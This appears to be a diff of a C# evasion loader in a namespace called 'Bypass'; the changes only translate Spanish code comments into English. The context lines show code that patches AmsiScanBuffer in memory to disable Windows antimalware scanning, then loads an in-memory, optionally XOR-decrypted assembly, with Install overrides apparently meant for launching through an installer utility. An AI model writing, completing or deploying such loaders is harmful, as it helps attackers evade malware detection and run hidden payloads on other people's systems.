@@ -208,7 +208,7 @@ namespace Bypass
             }
         }
 
-        // ==================== AMSI PATCHING - VERSIÓN SIMPLIFICADA ====================
+        // ==================== AMSI PATCHING - SIMPLIFIED VERSION ====================
         private static class AMSIPatcher
         {
             public static bool PatchAMSI()
@@ -217,7 +217,7 @@ namespace Bypass
                 {
                     DebugLogger.Log("Starting AMSI patch procedure");
 
-                    // Cargar amsi.dll
+                    // Load amsi.dll
                     IntPtr amsiModule = LoadLibrary(AMSI_DLL);
                     if (amsiModule == IntPtr.Zero)
                     {
@@ -227,7 +227,7 @@ namespace Bypass
 
                     DebugLogger.LogMemory($"{AMSI_DLL} loaded at", amsiModule);
 
-                    // Obtener dirección de AmsiScanBuffer
+                    // Obtain AmsiScanBuffer address
                     IntPtr amsiScanBufferPtr = GetProcAddress(amsiModule, AMSI_SCAN_BUFFER);
                     if (amsiScanBufferPtr == IntPtr.Zero)
                     {
@@ -237,7 +237,7 @@ namespace Bypass
 
                     DebugLogger.LogMemory($"{AMSI_SCAN_BUFFER} address", amsiScanBufferPtr);
 
-                    // Crear parche según arquitectura
+                    // Patch depending on the arch
                     byte[] patchBytes;
                     if (IntPtr.Size == 8)  // 64-bit
                     {
@@ -252,7 +252,7 @@ namespace Bypass
 
                     DebugLogger.HexDump(patchBytes, "AMSI patch bytes");
 
-                    // Cambiar protección de memoria
+                    // Change memory protection
                     bool success = VirtualProtect(
                         amsiScanBufferPtr,
                         (UIntPtr)patchBytes.Length,
@@ -267,10 +267,10 @@ namespace Bypass
 
                     DebugLogger.Log($"Memory protection changed. Old protection: 0x{oldProtect:X}");
 
-                    // Aplicar parche
+                    // Apply patch
                     Marshal.Copy(patchBytes, 0, amsiScanBufferPtr, patchBytes.Length);
 
-                    // Verificar parche
+                    // Verify patch
                     byte[] verifyBytes = new byte[patchBytes.Length];
                     Marshal.Copy(amsiScanBufferPtr, verifyBytes, 0, patchBytes.Length);
 
@@ -343,14 +343,14 @@ namespace Bypass
             {
                 DebugLogger.Log($"Loading assembly ({assemblyBytes.Length} bytes)");
 
-                // Validar que tenga el header MZ (opcional, puede ser .NET assembly)
+                // Validate that it has the MZ header (optional, it can be a .NET assembly)
                 if (assemblyBytes.Length < 2)
                 {
                     DebugLogger.LogError("Assembly too small");
                     throw new BadImageFormatException("Assembly too small");
                 }
 
-                // Intentar cargar el assembly
+                // Try to load assembly
                 Assembly assembly = Assembly.Load(assemblyBytes);
                 DebugLogger.Log($"Assembly loaded: {assembly.FullName}");
 
@@ -534,7 +534,7 @@ namespace Bypass
                 Console.WriteLine($"[+] XOR Decryption: Enabled");
             }
 
-            // Step 1: Patch AMSI (opcional, continuar si falla)
+            // Step 1: Patch AMSI (optional, continue if failure)
             DebugLogger.Log("Step 1: Patching AMSI");
             bool amsiPatched = AMSIPatcher.PatchAMSI();
             if (!amsiPatched)
@@ -622,7 +622,7 @@ namespace Bypass
             Console.WriteLine($"[+] Execution Finished");
         }
 
-        // Métodos Install y Uninstall requeridos
+        // Install and Uninstall methods required
         public override void Install(System.Collections.IDictionary savedState)
         {
             base.Install(savedState);
